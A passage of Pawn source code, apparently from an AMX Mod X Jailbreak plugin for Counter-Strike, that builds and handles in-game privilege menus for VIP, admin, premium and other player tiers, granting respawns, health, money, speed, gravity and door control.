			iKeys |= (1<<4);
		}
		else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\wУже есть\d]^n", id, "JBE_MENU_VIP_SPEED");
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_VIP_SPEED", g_iAllCvars[VIP_SPEED_ROUND]);
	
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L", id, "JBE_MENU_BACK");
	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \w%L", id, "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_VipMenu");
}

public Handle_VipMenu(id, iKey)
{
	if(g_iDayMode != 1 && g_iDayMode != 2) return PLUGIN_HANDLED;
	new szName[32];
	get_user_name(id, szName, charsmax(szName));
	switch(iKey)
	{
		case 0:
        {
		    if(IsNotSetBit(g_iBitUserAlive, id))
		    {
                ExecuteHamB(Ham_CS_RoundRespawn, id);
			    UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_VIP_RESPAWN", szName);
				UTIL_SendAudio(0, _, g_szSounds[PRIV_RES]);
			}
        }
		case 1:
        {
            if(IsSetBit(g_iBitUserAlive, id) && g_iVipHealth[id] && get_user_health(id) < 100)
            {
                set_pev(id, pev_health, 100.0);
                UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_VIP_HEALTH", szName);
                g_iVipHealth[id]--;
            }
        }
		case 2:
		{
			jbe_set_user_money(id, g_iUserMoney[id] + g_iAllCvars[VIP_MONEY_NUM], 1);
			g_iBomjData[id][MONEY_VIP] = 0;
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_VIP_MONEY", szName);
		}
		case 3:
		{
			SetBit(g_iBitUserVoice, id);
			g_iBomjData[id][GOLOS_VIP] = 0;
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_VIP_VOICE", szName);
		}
		case 4:
		{
			SetBit(g_iBitFastRun, id);
			ExecuteHamB(Ham_Player_ResetMaxSpeed, id);
			g_iBomjData[id][SPEED_VIP] = 0;
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_VIP_SPEED", szName);
		}
		case 8: return Show_PrivilegesMenu(id);
		case 9: return PLUGIN_HANDLED;
	}
	return Show_VipMenu(id);
}

public _native_blockct(iType)
{
    switch(iType)
    {
        case 0: g_iBlockCt = false;
        case 1: g_iBlockCt = true;
    }
}

public _native_blockshop(iType)
{
    switch(iType)
    {
        case 0: g_iBlockShop = false;
        case 1: g_iBlockShop = true;
    }
}

native jbe_blockct(iType); 
Show_AdminMenu(id)
{
	if(jbe_menu_blocked(id)) return PLUGIN_HANDLED;
	new szMenu[512], iKeys = (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<9), iLen = formatex(szMenu, charsmax(szMenu), "\w%L^n^n", id, "JBE_MENU_ADMIN_TITLE");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \w%L^n", id, "JBE_MENU_ADMIN_KICK");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \w%L^n", id, "JBE_MENU_ADMIN_BAN");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \w%L^n", id, "JBE_MENU_ADMIN_SLAP");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[4] \w%L^n", id, "JBE_MENU_ADMIN_TEAM");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[5] \w%L^n", id, "JBE_MENU_ADMIN_KT", Blockshopct[0] ? "\rзапрещено" : "\yразрешено");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[6] \w%L^n", id, "JBE_MENU_ADMIN_GIVE_GOLOS");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[7] \w%L^n", id, "JBE_MENU_ADMIN_HOOK");
	if(g_iUserTeam[id] == 1 || g_iUserTeam[id] == 2)
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L", id, "JBE_MENU_BACK");
		iKeys |= (1<<8);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n");
	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \w%L", id, "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_AdminMenu");
}

public Handle_AdminMenu(id, iKey)
{
    new name[32];
    get_user_name(id, name, charsmax(name));
	switch(iKey)
	{
		case 0: client_cmd(id, "amx_kickmenu");
		case 1: client_cmd(id, "amx_banmenu");
		case 2: client_cmd(id, "amx_slapmenu");
		case 3: client_cmd(id, "amx_teammenu");
		case 4:
        {
            if(!Blockshopct[0])
            {
                jbe_blockct(1);
				UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_ADMIN_KT_OFF", name);
                Blockshopct[0] = true;
            } 
            else 
            {
                jbe_blockct(0);
				UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_ADMIN_KT_ON", name);
                Blockshopct[0] = false;
            }
        }
		case 5: return Cmd_VoiceControlMenuAdmin(id);
		case 6: return Show_HookMenu(id);
		case 8: return Show_PrivilegesMenu(id);
		case 9: return PLUGIN_HANDLED;
	}
	return Show_AdminMenu(id);
}

Show_PremiumMenu(id)
{
	if(g_iDayMode != 1 && g_iDayMode != 2 || jbe_menu_blocked(id)) return PLUGIN_HANDLED;
	jbe_informer_offset_up(id);
	new szMenu[512], iKeys = (1<<8|1<<9), iAlive = IsSetBit(g_iBitUserAlive, id), iLen = formatex(szMenu, charsmax(szMenu), "\w%L^n^n", id, "JBE_MENU_PREMIUM_TITLE");
	
	if(!iAlive && g_iPremiumData[id][RES_PREM] >= g_iAllCvars[PREMIUM_RESPAWN_NUM])
	{
		if(!g_szWantedNames[0])
		{
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \w%L^n", id, "JBE_MENU_PREMIUM_RESPAWN");
			iKeys |= (1<<0);
		}
		else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\wРозыск\d]^n", id, "JBE_MENU_PREMIUM_RESPAWN");
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_PREMIUM_RESPAWN", g_iAllCvars[PREMIUM_RESPAWN_NUM]);
	
	if(iAlive && g_iPremiumData[id][HP_PREM] >= g_iAllCvars[PREMIUM_HP_ROUND])
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \w%L^n", id, "JBE_MENU_PREMIUM_HP");
		iKeys |= (1<<1);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_PREMIUM_HP", g_iAllCvars[PREMIUM_HP_ROUND]);
	
	if(iAlive && g_iPremiumData[id][MONEY_PREM] >= g_iAllCvars[PREMIUM_MONEY_ROUND])
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \w%L^n", id, "JBE_MENU_PREMIUM_MONEY", g_iAllCvars[PREMIUM_MONEY_NUM]);
		iKeys |= (1<<2);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_PREMIUM_MONEY", g_iAllCvars[PREMIUM_MONEY_NUM], g_iAllCvars[PREMIUM_MONEY_ROUND]);
	
	if(iAlive && g_iPremiumData[id][SPEED_PREM] >= g_iAllCvars[PREMIUM_SPEED_ROUND])
	{
		if(IsNotSetBit(g_iBitFastRun, id))
		{
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[4] \w%L^n", id, "JBE_MENU_PREMIUM_SPEED");
			iKeys |= (1<<3);
		}
		else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\wУже есть\d]^n", id, "JBE_MENU_PREMIUM_SPEED");
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_PREMIUM_SPEED", g_iAllCvars[PREMIUM_SPEED_ROUND]);
	
	if(iAlive && g_iPremiumData[id][GRAV_PREM] >= g_iAllCvars[PREMIUM_GRAV_ROUND])
	{
		if(pev(id, pev_gravity) == 1.0)
		{
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[5] \w%L^n", id, "JBE_MENU_PREMIUM_GRAV");
			iKeys |= (1<<4);
		}
		else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\wУже есть\d]^n", id, "JBE_MENU_PREMIUM_GRAV");
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_PREMIUM_GRAV", g_iAllCvars[PREMIUM_GRAV_ROUND]);
	
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L", id, "JBE_MENU_BACK");
	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \w%L", id, "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_PremiumMenu");
}

public Handle_PremiumMenu(id, iKey)
{
	if(g_iDayMode != 1 && g_iDayMode != 2) return PLUGIN_HANDLED;
	new szName[32];
	get_user_name(id, szName, charsmax(szName));
	switch(iKey)
	{
		case 0:
        {
			g_iPremiumData[id][RES_PREM] = 0;
            ExecuteHamB(Ham_CS_RoundRespawn, id);
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_PREMIUM_RES", szName);
			UTIL_SendAudio(0, _, g_szSounds[PRIV_RES]);
        }
		case 1:
        {
			set_pev(id, pev_health, pev(id, pev_health) + 20.0 );
            g_iPremiumData[id][HP_PREM] = 0;
            UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_PREMIUM_HP", szName);
        }
		case 2:
		{
			jbe_set_user_money(id, g_iUserMoney[id] + g_iAllCvars[PREMIUM_MONEY_NUM], 1);
			g_iPremiumData[id][MONEY_PREM] = 0;
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_PREMIUM_MONEY", szName);
		}
	    case 3:
		{
			SetBit(g_iBitFastRun, id);
			ExecuteHamB(Ham_Player_ResetMaxSpeed, id);
			g_iPremiumData[id][SPEED_PREM] = 0;
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_PREMIUM_SPEED", szName);
		}
	    case 4:
		{
			set_pev(id, pev_gravity, 0.6);
			g_iPremiumData[id][GRAV_PREM] = 0;
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_PREMIUM_GRAV", szName);
		}
		case 8: return Show_PrivilegesMenu(id);
		case 9: return PLUGIN_HANDLED;
	}
	return Show_PremiumMenu(id);
}

Show_AlphaMenu(id)
{
	if(g_iDayMode != 1 && g_iDayMode != 2 || jbe_menu_blocked(id)) return PLUGIN_HANDLED;
	new szMenu[512], iKeys = (1<<6|1<<7|1<<8|1<<9), iAlive = IsSetBit(g_iBitUserAlive, id), iLen = formatex(szMenu, charsmax(szMenu), "\w%L^n^n", id, "JBE_MENU_ALPHA_TITLE");
	
	if(iAlive && g_iAlphaData[id][MONEY_ALPHA] >= g_iAllCvars[ALPHA_MONEY_ROUND])
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \w%L^n", id, "JBE_MENU_ALPHA_MONEY", g_iAllCvars[ALPHA_MONEY_NUM]);
		iKeys |= (1<<0);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_ALPHA_MONEY", g_iAllCvars[ALPHA_MONEY_NUM], g_iAllCvars[ALPHA_MONEY_ROUND]);
	
	if(iAlive && g_iPremiumData[id][SPEED_ALPHA] >= g_iAllCvars[ALPHA_SPEED_ROUND])
	{
		if(IsNotSetBit(g_iBitFastRun, id))
		{
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \w%L^n", id, "JBE_MENU_ALPHA_SPEED");
			iKeys |= (1<<1);
		}
		else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\wУже есть\d]^n", id, "JBE_MENU_ALPHA_SPEED");
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_ALPHA_SPEED", g_iAllCvars[PREMIUM_SPEED_ROUND]);
	
	if(iAlive && g_iPremiumData[id][GRAV_ALPHA] >= g_iAllCvars[ALPHA_GRAV_ROUND])
	{
		if(pev(id, pev_gravity) == 1.0)
		{
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \w%L^n", id, "JBE_MENU_ALPHA_GRAV");
			iKeys |= (1<<2);
		}
		else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\wУже есть\d]^n", id, "JBE_MENU_ALPHA_GRAV");
	}  
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_ALPHA_GRAV", g_iAllCvars[ALPHA_GRAV_ROUND]);
	
	if(iAlive && g_iAlphaData[id][NOJ_ALPHA] >= g_iAllCvars[ALPHA_NOJ_ROUND] && jbe_get_user_team(id) == 1)
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[4] \w%L^n", id, "JBE_MENU_ALPHA_NOJ");
		iKeys |= (1<<3);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_ALPHA_NOJ", g_iAllCvars[ALPHA_NOJ_ROUND]);
	
	if(iAlive && g_iAlphaData[id][FD_ALPHA] >= g_iAllCvars[ALPHA_FD_ROUND] && jbe_get_user_team(id) == 1)
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[5] \w%L^n", id, "JBE_MENU_ALPHA_FD");
		iKeys |= (1<<4);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_ALPHA_FD", g_iAllCvars[ALPHA_FD_ROUND]);
	
	if(iAlive && g_iAlphaData[id][JUMP_ALPHA] >= g_iAllCvars[ALPHA_JUMP_ROUND])
	{
		if(IsNotSetBit(g_iBitDoubleJump, id))
		{
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[6] \w%L^n", id, "JBE_MENU_ALPHA_JUMP");
			iKeys |= (1<<5);
		}
		else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\wУже есть\d]^n", id, "JBE_MENU_ALPHA_JUMP");
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_ALPHA_JUMP", g_iAllCvars[ALPHA_JUMP_ROUND]);
	
	if(g_bDoorStatus) iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[7] \wЗакрыть клетки^n^n");
    else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[7] \wОткрыть клетки^n^n");
	
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[8] \w%L^n", id, "JBE_MENU_ALPHA_BLOCK");
	
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L", id, "JBE_MENU_BACK");
	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \w%L", id, "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_AlphaMenu");
}

public Handle_AlphaMenu(id, iKey)
{
	if(g_iDayMode != 1 && g_iDayMode != 2) return PLUGIN_HANDLED;
	new szName[32];
	get_user_name(id, szName, charsmax(szName));
	switch(iKey)
	{
		case 0:
		{
			jbe_set_user_money(id, g_iUserMoney[id] + g_iAllCvars[ALPHA_MONEY_NUM], 1);
			g_iAlphaData[id][MONEY_ALPHA] = 0;
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_ALHPA_MONEY", szName);
		}
	    case 1:
		{
			SetBit(g_iBitFastRun, id);
			ExecuteHamB(Ham_Player_ResetMaxSpeed, id);
			g_iAlphaData[id][SPEED_ALPHA] = 0;
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_ALPHA_SPEED", szName);
		}
	    case 2:
		{
			set_pev(id, pev_gravity, 0.6);
			g_iAlphaData[id][GRAV_ALPHA] = 0;
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_ALPHA_GRAV", szName);
		}
		case 3:
        {
			   ClearBit(g_iBitSharpening, id);
			   ClearBit(g_iBitScrewdriver, id);
			   ClearBit(g_iBitMachete, id);
			   ClearBit(g_iBitSerp, id);
			   SetBit(g_iBitBalisong, id);
			   g_iAlphaData[id][NOJ_ALPHA] = 0;
               UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_ALPHA_NOJ", szName);
               UTIL_SayText(id, "%L %L", id, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ID_SHOP_WEAPON_HELP");
        }
	    case 4:
		{
			jbe_add_user_free(id);
			g_iAlphaData[id][FD_ALPHA] = 0;
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_ALPHA_FD", szName);
		}
	    case 5:
		{
			SetBit(g_iBitDoubleJump, id);
			g_iAlphaData[id][JUMP_ALPHA] = 0;
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_ALPHA_JUMP", szName);
		}
		case 6:
        {
            if(g_bDoorStatus)
            {
                jbe_close_doors();
				UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_ALPHA_KLETKI_OFF", szName);
            }    
            else 
            {
                jbe_open_doors();
                UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_ALPHA_KLETKI_ON", szName);
            }
        }
		case 7: return Cmd_BlockedGuardMenu(id);
		case 8: return Show_PrivilegesMenu(id);
		case 9: return PLUGIN_HANDLED;
	}
	return Show_AlphaMenu(id);
}

Show_StrajMenu(id)
{
	if(g_iDayMode != 1 && g_iDayMode != 2 || jbe_menu_blocked(id)) return PLUGIN_HANDLED;
	new szMenu[512], iKeys = (1<<8|1<<9), iAlive = IsSetBit(g_iBitUserAlive, id), iLen = formatex(szMenu, charsmax(szMenu), "\w%L^n^n", id, "JBE_MENU_STRAJ_TITLE");
	
	if(iAlive && g_iStrajData[id][SKIN_STRAJ] >= g_iAllCvars[STRAJ_SKIN_ROUND])
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \w%L^n", id, "JBE_MENU_STRAJ_SKIN");
		iKeys |= (1<<0);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_STRAJ_SKIN", g_iAllCvars[STRAJ_SKIN_ROUND]);
	
	if(iAlive && g_iStrajData[id][HP_STRAJ] >= g_iAllCvars[STRAJ_HP_ROUND])
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \w%L^n", id, "JBE_MENU_STRAJ_HP");
		iKeys |= (1<<1);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_STRAJ_HP", g_iAllCvars[STRAJ_HP_ROUND]);
	
	if(iAlive && g_iStrajData[id][MONEY_STRAJ] >= g_iAllCvars[STRAJ_MONEY_ROUND])
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \w%L^n", id, "JBE_MENU_STRAJ_MONEY", g_iAllCvars[STRAJ_MONEY_NUM]);
		iKeys |= (1<<2);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_STRAJ_MONEY", g_iAllCvars[STRAJ_MONEY_NUM], g_iAllCvars[STRAJ_MONEY_ROUND]);
	
	if(iAlive && g_iStrajData[id][GOD_STRAJ] >= g_iAllCvars[STRAJ_GOD_ROUND] && jbe_get_user_team(id) == 2)
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[4] \w%L^n", id, "JBE_MENU_STRAJ_GOD");
		iKeys |= (1<<3);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_STRAJ_GOD", g_iAllCvars[STRAJ_GOD_ROUND]);
	
	if(iAlive && g_iStrajData[id][FOOT_STRAJ] >= g_iAllCvars[STRAJ_FOOT_ROUND])
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[5] \w%L^n", id, "JBE_MENU_STRAJ_FOOT");
		iKeys |= (1<<4);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_STRAJ_FOOT", g_iAllCvars[STRAJ_FOOT_ROUND]);
	
	if(iAlive && g_iStrajData[id][NOJ_STRAJ] >= g_iAllCvars[STRAJ_NOJ_ROUND] && jbe_get_user_team(id) == 1)
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[6] \w%L^n", id, "JBE_MENU_STRAJ_NOJ");
		iKeys |= (1<<5);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_STRAJ_NOJ", g_iAllCvars[STRAJ_NOJ_ROUND]);
	
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L", id, "JBE_MENU_BACK");
	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \w%L", id, "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_StrajMenu");
}

public Handle_StrajMenu(id, iKey)
{
	if(g_iDayMode != 1 && g_iDayMode != 2) return PLUGIN_HANDLED;
	new szName[32];
	get_user_name(id, szName, charsmax(szName));
	switch(iKey)
	{
		case 0:
        {
			jbe_set_user_model(id, g_szPlayerModel[STRAJ]);
            g_iStrajData[id][SKIN_STRAJ] = 0;
            UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_STRAJ_SKIN", szName);
        }
		case 1:
        {
			set_pev(id, pev_health, pev(id, pev_health) + 50.0 );
            g_iStrajData[id][HP_STRAJ] = 0;
            UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_STRAJ_HP", szName);
        }
		case 2:
		{
			jbe_set_user_money(id, g_iUserMoney[id] + g_iAllCvars[STRAJ_MONEY_NUM], 1);
			g_iStrajData[id][MONEY_STRAJ] = 0;
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_STRAJ_MONEY", szName);
		}
		case 3:
        {
            set_user_godmode(id, 1);
            g_iStrajData[id][GOD_STRAJ] = 0;
            UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_STRAJ_GOD", szName);
        }
		case 4:
        {
            set_user_footsteps(id, 1);
            g_iStrajData[id][FOOT_STRAJ] = 0;
            UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_STRAJ_FOOT", szName);
        }
		case 5:
        {
		    ClearBit(g_iBitBalisong, id);
			ClearBit(g_iBitScrewdriver, id);
			ClearBit(g_iBitMachete, id);
			ClearBit(g_iBitSerp, id);
            SetBit(g_iBitSharpening, id);
            g_iStrajData[id][NOJ_STRAJ] = 0;
            UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_STRAJ_NOJ", szName);
		    UTIL_SayText(id, "%L %L", id, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ID_SHOP_WEAPON_HELP");
        }
		case 8: return Show_PrivilegesMenu(id);
		case 9: return PLUGIN_HANDLED;
	}
	return Show_StrajMenu(id);
}

Show_DeltaMenu(id)
{
	if(g_iDayMode != 1 && g_iDayMode != 2 || jbe_menu_blocked(id)) return PLUGIN_HANDLED;
	
	new szMenu[1024], iKeys = (1<<8|1<<9), iAlive = IsSetBit(g_iBitUserAlive, id), iLen = formatex(szMenu, charsmax(szMenu), "\w%L^n^n", id, "JBE_MENU_DELTA_TITLE");
	
	if(g_iDeltaData[id][RES_ROUND_DELTA] >= g_iAllCvars[DELTA_RES_ROUND])
	{
		if(!g_szWantedNames[0])
		{
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \w%L \w[\d%d\w]^n", id, "JBE_MENU_DELTA_RES", g_iAllCvars[DELTA_RES_NUM]);
			iKeys |= (1<<0);
		}
		else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\wРозыск\d]^n", id, "JBE_MENU_DELTA_RES");
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_DELTA_RES", g_iAllCvars[DELTA_RES_ROUND]);
	
	if(iAlive && g_iDeltaData[id][HP_DELTA] >= g_iAllCvars[DELTA_HP_ROUND])
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \w%L^n", id, "JBE_MENU_DELTA_HP");
		iKeys |= (1<<1);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_DELTA_HP", g_iAllCvars[DELTA_HP_ROUND]);
	
	if(iAlive && g_iDeltaData[id][MEGA_JUMP_DELTA] >= g_iAllCvars[DELTA_JUMP_ROUND])
	{
		if(IsNotSetBit(g_iBitHingJump, id))
		{
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \w%L^n", id, "JBE_MENU_DELTA_JUMP");
			iKeys |= (1<<2);
		}
		else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\wУже есть\d]^n", id, "JBE_MENU_DELTA_JUMP");
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_DELTA_JUMP", g_iAllCvars[DELTA_JUMP_ROUND]);
	
	if(iAlive && g_iDeltaData[id][MONEY_DELTA] >= g_iAllCvars[DELTA_MONEY_ROUND])
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[4] \w%L^n", id, "JBE_MENU_DELTA_MONEY", g_iAllCvars[DELTA_MONEY_NUM]);
		iKeys |= (1<<3);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_DELTA_MONEY", g_iAllCvars[DELTA_MONEY_NUM], g_iAllCvars[DELTA_MONEY_ROUND]);
	
	if(iAlive && g_iDeltaData[id][FD_DELTA] >= g_iAllCvars[DELTA_FD_ROUND] && jbe_get_user_team(id) == 1)
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[5] \w%L^n", id, "JBE_MENU_DELTA_FD");
		iKeys |= (1<<4);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_DELTA_FD", g_iAllCvars[DELTA_FD_ROUND]);
	
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L", id, "JBE_MENU_BACK");
